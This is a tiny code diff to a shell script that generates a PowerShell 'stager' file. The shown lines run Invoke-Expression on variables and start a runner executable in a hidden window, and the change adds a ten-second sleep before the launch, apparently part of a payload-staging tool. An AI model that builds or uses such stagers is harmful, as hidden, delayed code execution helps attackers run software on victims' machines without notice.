@@ -128,6 +128,8 @@ cat << EOF > stager.ps1
 Invoke-Expression \$WR
 Invoke-Expression \$RN
 
+Start-Sleep -Seconds 10
+
 Start-Process -FilePath "\$outputRunnerPath" -WindowStyle Hidden
 EOF
 echo "Powershell script is ready"
